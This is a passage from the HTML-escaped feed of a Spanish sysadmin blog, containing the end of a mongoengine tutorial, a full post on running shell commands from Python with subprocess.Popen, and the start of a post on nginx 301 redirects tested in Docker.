    &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : ObjectId&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;59b1a4bb093f961b0aa6ecff&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;_cls&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;Page&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;title&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;About&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;content&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;blah&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : ObjectId&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;59b1a4bc093f961b0aa6ed01&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;_cls&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;Page.Post&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;title&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;Hello world&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;content&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;lorem ipsum&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;author&amp;quot;&lt;/span&gt; : ObjectId&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;59b1a4bb093f961b0aa6ed00&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;date&amp;quot;&lt;/span&gt; : ISODate&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;2017-09-07T19:57:47.993Z&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;tags&amp;quot;&lt;/span&gt; : &lt;span class="o"&gt;[&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;hello&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;world&amp;quot;&lt;/span&gt;
    &lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Consultar los objetos de la base de datos requiere encontrarlos primero, con el método &lt;code&gt;Document.objects&lt;/code&gt;. Esto nos puede traer un cursor de objetos o podemos invocar el método &lt;code&gt;first&lt;/code&gt; para traer uno solo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@sirius:~/projects/mongoengine$ cat consulta.py 
&lt;span class="c1"&gt;#!/usr/bin/env python&lt;/span&gt;

from models import Author, Post, connect

connect&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mongodb://localhost:27017/test&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Author.objects&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Gerard&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;.first&lt;span class="o"&gt;()&lt;/span&gt;
print &lt;span class="s1"&gt;&amp;#39;Author:&amp;#39;&lt;/span&gt;, a.name
&lt;span class="k"&gt;for&lt;/span&gt; post in Post.objects&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;author&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;a&lt;span class="o"&gt;)&lt;/span&gt;:
    print &lt;span class="s1"&gt;&amp;#39;* Post:&amp;#39;&lt;/span&gt;, post.title
    print &lt;span class="s1"&gt;&amp;#39;  Tags:&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;, &amp;#39;&lt;/span&gt;.join&lt;span class="o"&gt;(&lt;/span&gt;post.tags&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@sirius:~/projects/mongoengine$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que buscamos un autor por su nombre, asumiendo que el primero nos vale. Una vez tenemos el autor podemos encontrar sus posts y escribir algunos datos en la salida estándar.&lt;/p&gt;
&lt;p&gt;Ejecutamos y vemos que el resultado es el esperado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@sirius:~/projects/mongoengine$ ./consulta.py 
Author: Gerard
* Post: Hello world
  Tags: hello, world
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@sirius:~/projects/mongoengine$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para modificar los objetos, tenemos que consultarlos, modificar el objeto e invocar de nuevo el método &lt;code&gt;save&lt;/code&gt;. De la misma manera, para borrarlo necesitamos el objeto en &lt;strong&gt;python&lt;/strong&gt; e invocar a continuación el método &lt;code&gt;delete&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Conclusión&lt;/h2&gt;
&lt;p&gt;Sin duda esta librería es una gran ayuda para hacer un gran desarrollo. Estoy seguro que va a servirme para mi siguiente proyecto personal.&lt;/p&gt;
&lt;p&gt;Hay muchas más cosas que se pueden hacer con este ODM; simplemente tenemos que ahondar en &lt;a href="http://docs.mongoengine.org/apireference.html"&gt;la documentación&lt;/a&gt;.&lt;/p&gt;</content><category term="python"></category><category term="mongodb"></category><category term="mongoengine"></category><category term="odm"></category></entry><entry><title>Ejecutando procesos desde python con popen</title><link href="http://www.linuxsysadmin.ml/2017/11/ejecutando-procesos-desde-python-con-popen.html" rel="alternate"></link><published>2017-11-20T10:00:00+01:00</published><updated>2017-11-20T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-11-20:/2017/11/ejecutando-procesos-desde-python-con-popen.html</id><summary type="html">&lt;p&gt;Algunas veces nos interesa lanzar comandos &lt;em&gt;bash&lt;/em&gt;, pero necesitamos de la potencia de &lt;em&gt;python&lt;/em&gt; para &lt;em&gt;parsear&lt;/em&gt; la salida. En otras ocasiones queremos lanzar los comandos &lt;em&gt;bash&lt;/em&gt; directamente desde &lt;em&gt;python&lt;/em&gt; porque se hace desde una aplicación web. En estos casos nos viene muy bien el módulo &lt;em&gt;subprocess&lt;/em&gt; que nos lo permite …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Algunas veces nos interesa lanzar comandos &lt;em&gt;bash&lt;/em&gt;, pero necesitamos de la potencia de &lt;em&gt;python&lt;/em&gt; para &lt;em&gt;parsear&lt;/em&gt; la salida. En otras ocasiones queremos lanzar los comandos &lt;em&gt;bash&lt;/em&gt; directamente desde &lt;em&gt;python&lt;/em&gt; porque se hace desde una aplicación web. En estos casos nos viene muy bien el módulo &lt;em&gt;subprocess&lt;/em&gt; que nos lo permite.&lt;/p&gt;
&lt;p&gt;Aunque no quiero dar detalles porque la idea es todavia una prueba de concepto, en mi caso concreto se trataba de hacer una herramienta web muy simple para lanzar &lt;em&gt;backups&lt;/em&gt; y &lt;em&gt;restores&lt;/em&gt; sobre &lt;strong&gt;mongodb&lt;/strong&gt;, usando los comandos &lt;em&gt;mongodump&lt;/em&gt; y &lt;em&gt;mongorestore&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;En este artículo he decidido poner dos ejemplos muy simplificados, de forma que no nos distraigan de lo que relamente es importante; uno es sobre como lanzar comandos y recoger resultados, mientras que el otro es un poco más avanzado y nos permite concatenar varios comandos como haríamos en &lt;em&gt;bash&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Un ejemplo simple&lt;/h2&gt;
&lt;p&gt;Supongamos que queremos graficar la carga del sistema, tal como nos las da el comando &lt;em&gt;uptime&lt;/em&gt;. Para ello tenemos que &lt;em&gt;parsear&lt;/em&gt; y convertir en números los tres valores que el comando nos da. Por ello tenemos el siguiente &lt;em&gt;script&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/popen$ cat uptimes.py
&lt;span class="c1"&gt;#!/usr/bin/env python&lt;/span&gt;

from subprocess import Popen, PIPE, STDOUT

&lt;span class="nv"&gt;proc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Popen&lt;span class="o"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;uptime&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;, &lt;span class="nv"&gt;stdout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;PIPE, &lt;span class="nv"&gt;stderr&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;STDOUT&lt;span class="o"&gt;)&lt;/span&gt;
out, &lt;span class="nv"&gt;err&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; proc.communicate&lt;span class="o"&gt;()&lt;/span&gt;

&lt;span class="nv"&gt;uptimes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; out.rstrip&lt;span class="o"&gt;()&lt;/span&gt;.split&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;load average: &amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)[&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;uptimes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; uptimes.split&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;, &amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="nv"&gt;uptimes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;float&lt;span class="o"&gt;(&lt;/span&gt;e.replace&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; e in uptimes&lt;span class="o"&gt;]&lt;/span&gt;

&lt;span class="nb"&gt;times&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1 minute&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;5 minutes&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;15 minutes&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; i in xrange&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
    print &lt;span class="s1"&gt;&amp;#39;Last %s: %s&amp;#39;&lt;/span&gt; % &lt;span class="o"&gt;(&lt;/span&gt;times&lt;span class="o"&gt;[&lt;/span&gt;i&lt;span class="o"&gt;]&lt;/span&gt;, uptimes&lt;span class="o"&gt;[&lt;/span&gt;i&lt;span class="o"&gt;])&lt;/span&gt;
gerard@atlantis:~/projects/popen$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La parte importante se limita a dos líneas, que son las que crean la variable &lt;code&gt;proc&lt;/code&gt; y la siguiente. Se ejecuta el comando especificado en el &lt;em&gt;array&lt;/em&gt; del primer parámetro de &lt;code&gt;Popen&lt;/code&gt;, sin indicar entrada estándar (no hay por defecto), redirigiendo la salida de error a la salida estándar, y dejando esta como &lt;code&gt;PIPE&lt;/code&gt; la convertimos en un &lt;em&gt;stream&lt;/em&gt;, que luego podemos enchufar a otro proceso o recoger con el método &lt;code&gt;communicate()&lt;/code&gt;, que es el caso.&lt;/p&gt;
&lt;p&gt;El resto es un mero ejercicio de &lt;em&gt;parsing&lt;/em&gt;; con algunas funciones básicas de la clase &lt;em&gt;string&lt;/em&gt; (&lt;em&gt;strip&lt;/em&gt;, &lt;em&gt;split&lt;/em&gt; y &lt;em&gt;replace&lt;/em&gt;) y algunos &lt;em&gt;castings&lt;/em&gt; a &lt;em&gt;float&lt;/em&gt;, tenemos lo que nos interesa. La parte de graficar queda como ejercicio para el lector.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/popen$ ./uptimes.py
Last &lt;span class="m"&gt;1&lt;/span&gt; minute: &lt;span class="m"&gt;0&lt;/span&gt;.28
Last &lt;span class="m"&gt;5&lt;/span&gt; minutes: &lt;span class="m"&gt;0&lt;/span&gt;.09
Last &lt;span class="m"&gt;15&lt;/span&gt; minutes: &lt;span class="m"&gt;0&lt;/span&gt;.03
gerard@atlantis:~/projects/popen$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y podemos ver que tenemos la respuesta esperada con los valores pelados, y listos para disponer de ellos como queramos.&lt;/p&gt;
&lt;h2&gt;Un ejemplo concatenando varios procesos&lt;/h2&gt;
&lt;p&gt;Este ejemplo es posiblemente uno de los más inútiles que puedo mostrar. Simplemente se trata de hacer algo como &lt;code&gt;seq 1 100 | grep 3 | grep 5&lt;/code&gt;. No es muy útil, pero nos va a ilustrar sobre como se hacen este tipo de cosntrucciones &lt;em&gt;bash&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;El truco consiste en hacer 3 procesos, para cada uno de los comandos, usando los &lt;em&gt;streams&lt;/em&gt; declarados con &lt;code&gt;PIPE&lt;/code&gt; para enchufarlos a la entrada estándar del siguiente comando:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;p1&lt;/strong&gt; ejecutará el &lt;code&gt;seq 1 100&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;p2&lt;/strong&gt; ejecutará un &lt;code&gt;grep 3&lt;/code&gt; sobre la entrada estándar, que será la salida estándar de &lt;strong&gt;p1&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;p3&lt;/strong&gt; ejecutará un &lt;code&gt;grep 5&lt;/code&gt; sobre la entrada estándar, que será la salida estándar de &lt;strong&gt;p2&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Y así queda nuestro &lt;em&gt;script&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/popen$ cat seq.py
&lt;span class="c1"&gt;#!/usr/bin/env python&lt;/span&gt;

from subprocess import Popen, PIPE

&lt;span class="nv"&gt;p1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Popen&lt;span class="o"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;seq&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;100&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;, &lt;span class="nv"&gt;stdout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;PIPE&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="nv"&gt;p2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Popen&lt;span class="o"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;grep&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;3&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;, &lt;span class="nv"&gt;stdin&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;p1.stdout, &lt;span class="nv"&gt;stdout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;PIPE&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="nv"&gt;p3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Popen&lt;span class="o"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;grep&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;5&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;, &lt;span class="nv"&gt;stdin&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;p2.stdout, &lt;span class="nv"&gt;stdout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;PIPE&lt;span class="o"&gt;)&lt;/span&gt;
p1.stdout.close&lt;span class="o"&gt;()&lt;/span&gt;
p2.stdout.close&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="nv"&gt;out&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; p3.communicate&lt;span class="o"&gt;()[&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;.strip&lt;span class="o"&gt;()&lt;/span&gt;

print out
gerard@atlantis:~/projects/popen$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Cabe indicar que el método &lt;code&gt;communicate()&lt;/code&gt; se llama solamente en el último comando de la cadena, para esperar que acabe y recoger así su salida estándar y su salida de error, que en este caso, desechamos.&lt;/p&gt;
&lt;p&gt;Solo queda comentar que los &lt;em&gt;streams&lt;/em&gt; de salida de &lt;strong&gt;p1&lt;/strong&gt; y de &lt;strong&gt;p2&lt;/strong&gt; se cierran después de enchufarlos a &lt;strong&gt;p3&lt;/strong&gt;, tal como sugiere la documentación, para evitar problemas en caso de que &lt;strong&gt;p3&lt;/strong&gt; acabe antes que &lt;strong&gt;p2&lt;/strong&gt;, o este acabe antes que &lt;strong&gt;p1&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;A partir de aquí, solo nos queda comprobar que el resultado es el mismo, tanto en &lt;em&gt;bash&lt;/em&gt;, como en &lt;em&gt;python&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/popen$ seq &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;100&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="m"&gt;5&lt;/span&gt;
&lt;span class="m"&gt;35&lt;/span&gt;
&lt;span class="m"&gt;53&lt;/span&gt;
gerard@atlantis:~/projects/popen$ ./seq.py
&lt;span class="m"&gt;35&lt;/span&gt;
&lt;span class="m"&gt;53&lt;/span&gt;
gerard@atlantis:~/projects/popen$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto ampliamos nuestra &lt;em&gt;toolbox&lt;/em&gt; de recursos, de forma que podamos encarar futuros retos con nuevas opciones.&lt;/p&gt;</content><category term="python"></category><category term="subprocess"></category><category term="popen"></category></entry><entry><title>Redirecciones a nivel de nginx</title><link href="http://www.linuxsysadmin.ml/2017/11/redirecciones-a-nivel-de-nginx.html" rel="alternate"></link><published>2017-11-13T10:00:00+01:00</published><updated>2017-11-13T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-11-13:/2017/11/redirecciones-a-nivel-de-nginx.html</id><summary type="html">&lt;p&gt;No son pocas las veces que queremos hacer una redirección de algunos de nuestros dominios a otros. Puede que queramos añadir el clásico &lt;code&gt;www&lt;/code&gt; delante del dominio, o tal vez queramos forzar el uso de &lt;code&gt;https&lt;/code&gt;. Hacer copias de nuestro dominio no es viable, pero podemos usar redirecciones fijas 301 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;No son pocas las veces que queremos hacer una redirección de algunos de nuestros dominios a otros. Puede que queramos añadir el clásico &lt;code&gt;www&lt;/code&gt; delante del dominio, o tal vez queramos forzar el uso de &lt;code&gt;https&lt;/code&gt;. Hacer copias de nuestro dominio no es viable, pero podemos usar redirecciones fijas 301.&lt;/p&gt;
&lt;p&gt;Vamos a suponer en este artículo que tenemos un servidor &lt;strong&gt;nginx&lt;/strong&gt; configurado para servir &lt;em&gt;virtualhosts&lt;/em&gt;. En este ejemplo, vamos a poner uno por defecto y otro de ejemplo.&lt;/p&gt;
&lt;p&gt;Las reglas son simples:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Serviremos la web de ejemplo para el dominio &lt;em&gt;www.example.com&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Queremos ver la misma web para el dominio &lt;em&gt;example.com&lt;/em&gt; y no queremos duplicar contenido&lt;/li&gt;
&lt;li&gt;Serviremos una web por defecto en cualquier otro caso, para ver si lo hemos hecho bien&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Preparación del ejemplo&lt;/h2&gt;
&lt;p&gt;Para que se pueda seguir el artículo, se proporciona el contexto necesario para construir una imagen &lt;strong&gt;docker&lt;/strong&gt; en donde probarlo. Empezamos por el &lt;em&gt;Dockerfile&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/nginx_redirects$ cat Dockerfile 
FROM alpine:3.5
RUN apk add --no-cache nginx &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    ln -s /dev/stdout /var/log/nginx/access.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    ln -s /dev/stderr /var/log/nginx/error.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    mkdir /run/nginx &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /etc/nginx/conf.d/default.conf
COPY nginx.conf /etc/nginx/
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/sbin/nginx&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;-g&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;daemon off;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
COPY conf.d/* /etc/nginx/conf.d/
COPY www/ /srv/www/
gerard@aldebaran:~/docker/nginx_redirects$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y añadimos las configuraciones que &lt;strong&gt;nginx&lt;/strong&gt; necesita:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/nginx_redirects$ cat nginx.conf 
worker_processes &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
events &lt;span class="o"&gt;{&lt;/span&gt;
    worker_connections &lt;span class="m"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
http &lt;span class="o"&gt;{&lt;/span&gt;
    include mime.types&lt;span class="p"&gt;;&lt;/span&gt;
    default_type application/octet-stream&lt;span class="p"&gt;;&lt;/span&gt;
    sendfile on&lt;span class="p"&gt;;&lt;/span&gt;
    keepalive_timeout &lt;span class="m"&gt;65&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    include conf.d/*&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@aldebaran:~/docker/nginx_redirects$ cat conf.d/www 
server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt; default&lt;span class="p"&gt;;&lt;/span&gt;
    server_name _&lt;span class="p"&gt;;&lt;/span&gt;
    root /srv/www/default&lt;span class="p"&gt;;&lt;/span&gt;
    index index.html&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    server_name www.example.com&lt;span class="p"&gt;;&lt;/span&gt;
    root /srv/www/www.example.com&lt;span class="p"&gt;;&lt;/span&gt;
    index index.html&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@aldebaran:~/docker/nginx_redirects$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A modo de ejemplo, adjuntamos dos sitios de juguete que nos permitirnán probar nuestros &lt;em&gt;virtualhosts&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/nginx_redirects$ tree www/
www/
├── default
│   └── index.html
└── www.example.com
    └── index.html

&lt;span class="m"&gt;2&lt;/span&gt; directories, &lt;span class="m"&gt;2&lt;/span&gt; files
gerard@aldebaran:~/docker/nginx_redirects$ cat www/default/index.html 
default site
gerard@aldebaran:~/docker/nginx_redirects$ cat www/www.example.com/index.html 
example site
gerard@aldebaran:~/docker/nginx_redirects$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Construid la imagen y ponedla a correr, con los comandos habituales.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Como queremos probar &lt;em&gt;virtualhosts&lt;/em&gt; y no queremos marear con servidores DNS, podemos tirar del fichero &lt;em&gt;/etc/hosts&lt;/em&gt;, para que todos los dominios apunten a nuestro contenedor.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ cat /etc/hosts
...  
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.2  example.com www.example.com www.otherdomain.com
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Problema y solución&lt;/h2&gt;
&lt;p&gt;Lanzamos una batería de peticiones con &lt;strong&gt;curl&lt;/strong&gt; o alguna herramienta similar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ curl http://www.example.com/
example site
gerard@aldebaran:~$ curl http://www.otherdomain.com/
default site
gerard@aldebaran:~$ curl http://example.com/
default site
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Todos los dominios apuntan a la dirección IP del mismo contenedor, y de ello sacamos algunas conclusiones:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;El dominio &lt;em&gt;www.example.com&lt;/em&gt; funciona según lo esperado&lt;/li&gt;
&lt;li&gt;El dominio por defecto salta ante las peticiones que no pertenecen al dominio &lt;em&gt;www.example.com&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Las peticiones al dominio &lt;em&gt;example.com&lt;/em&gt; caen en el &lt;em&gt;virtualhost&lt;/em&gt; por defecto&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Podríamos haber creado otro &lt;em&gt;virtualhost&lt;/em&gt; que sirviera una copia (o la misma carpeta) del dominio de ejemplo, pero no es elegante y en el caso de querer HTTPS no serviría. En estos casos, el estándar &lt;em&gt;de facto&lt;/em&gt; es hacer una redirección al dominio correcto, mediante un código HTTP 301. Esto le indicará al navegador que la redirección es permanente y hará que este "se acuerde" de la redirección.&lt;/p&gt;
&lt;p&gt;Para ello necesitamos un nuevo &lt;em&gt;virtualhost&lt;/em&gt;, o adaptar el que tenemos para que acepte expresiones regulares; no vamos a seguir este camino por simplicidad.&lt;/p&gt;
&lt;p&gt;Solo necesitaríamos utilizar el &lt;a href="http://nginx.org/en/docs/http/ngx_http_rewrite_module.html#return"&gt;rewrite module&lt;/a&gt; de &lt;strong&gt;nginx&lt;/strong&gt; para forzar un código de retorno a la URL correcta. Exponemos este ejemplo a continuación:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/nginx_redirects$ cat conf.d/www 
server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt; default&lt;span class="p"&gt;;&lt;/span&gt;
    server_name _&lt;span class="p"&gt;;&lt;/span&gt;
    root /srv/www/default&lt;span class="p"&gt;;&lt;/span&gt;
    index index.html&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    server_name www.example.com&lt;span class="p"&gt;;&lt;/span&gt;
